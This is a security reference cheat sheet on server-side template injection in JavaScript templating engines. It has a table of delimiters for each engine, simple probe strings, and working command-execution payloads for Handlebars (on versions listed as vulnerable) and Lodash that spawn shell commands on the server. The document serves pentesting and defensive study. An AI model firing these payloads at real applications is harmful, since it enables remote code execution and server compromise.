# server side template injection - javascript

> server-side template injection (ssti)  occurs when an attacker can inject malicious code into a server-side template, causing the server to execute arbitrary commands. in the context of javascript, ssti vulnerabilities can arise when using server-side templating engines like handlebars, ejs, or pug, where user input is integrated into templates without adequate sanitization.


## summary

- [templating libraries](#templating-libraries)
- [handlebars](#handlebars)
    - [handlebars - basic injection](#handlebars---basic-injection)
    - [handlebars - command execution](#handlebars---command-execution)
- [lodash](#lodash)
    - [lodash - basic injection](#lodash---basic-injection)
    - [lodash - command execution](#lodash---command-execution)
- [references](#references)


## templating libraries

| template name | payload format |
| ------------ | --------- |
| dotjs        | `{{= }}`  |
| dustjs       | `{}`      |
| ejs          | `<% %>`   |
| handlebarsjs | `{{ }}`   |
| hoganjs      | `{{ }}`   |
| lodash       | `{{= }}`  |
| mustachejs   | `{{ }}`   |
| nunjucksjs   | `{{ }}`   |
| pugjs        | `#{}`     |
| twigjs       | `{{ }}`   |
| underscorejs | `<% %>`   |
| velocityjs   | `#=set($x="")$x` |
| vuejs        | `{{ }}`   |


## handlebars

[official website](https://handlebarsjs.com/)
> handlebars compiles templates into javascript functions.

### handlebars - basic injection

```js
{{this}}
{{self}}
```

### handlebars - command execution

this payload only work in handlebars versions, fixed in [ghsa-q42p-pg8m-cqh6](https://github.com/advisories/ghsa-q42p-pg8m-cqh6):

* `>= 4.1.0`, `< 4.1.2`
* `>= 4.0.0`, `< 4.0.14`
* `< 3.0.7`

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execsync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## lodash

[official website](https://lodash.com/docs/4.17.15)
> a modern javascript utility library delivering modularity, performance & extras.

### lodash - basic injection

how to create a template:

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string:** the template string.
- **options.interpolate:** it is a regular expression that specifies the html *interpolate* delimiter.
- **options.evaluate:** it is a regular expression that specifies the html *evaluate* delimiter.
- **options.escape:** it is a regular expression that specifies the html *escape* delimiter.

for the purpose of rce, the delimiter of templates is determined by the **options.evaluate** parameter.

```javascript
{{= _.version}}
${= _.version}
<%= _.version %>


{{= _.templatesettings.evaluate }}
${= _.version}
<%= _.version %>
```

### lodash - command execution

```js
{{x=object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```


## references

- [exploiting less.js to achieve rce - jeremy buis - july 1, 2021](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)
- [handlebars template injection and rce in a shopify app - mahmoud gamal - april 4, 2019](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)